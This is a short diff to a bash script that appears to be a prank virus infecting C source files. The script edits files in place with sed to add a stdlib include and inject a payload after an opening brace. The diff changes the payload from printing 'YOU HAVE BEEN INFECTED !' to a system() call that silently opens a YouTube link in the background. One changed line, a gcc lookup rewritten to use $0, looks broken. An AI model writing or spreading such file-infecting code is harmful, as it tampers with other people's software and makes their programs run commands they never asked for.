@@ -1,11 +1,12 @@
 #!/bin/bash
 
+include="#include <stdlib.h>"
+
 payload="
-#include <stdio.h>\n
-printf(\"YOU HAVE BEEN INFECTED !\");\n
+system(\"xdg-open \\'https://www.youtube.com/watch?v=o-YBDTqX_ZU\\' > /dev/null 2>/dev/null &\");\n
 "
 
-gcc=$(whereis gcc | cut -d " " -f2) 
+gcc=$(whereis $0 | cut -d " " -f2) 
 patched_file=()
 
 function patch {
@@ -18,6 +19,8 @@ function patch {
 		while true
 		do
 			if echo ${found_curly[@]} | grep -q -w "$line"; then
+				sed -i "1a\ $(echo $include)" $1
+				line=$(($line + 1))
 				sed -i "${line}a\ $(echo $payload)" $1	
 				break 
 			else
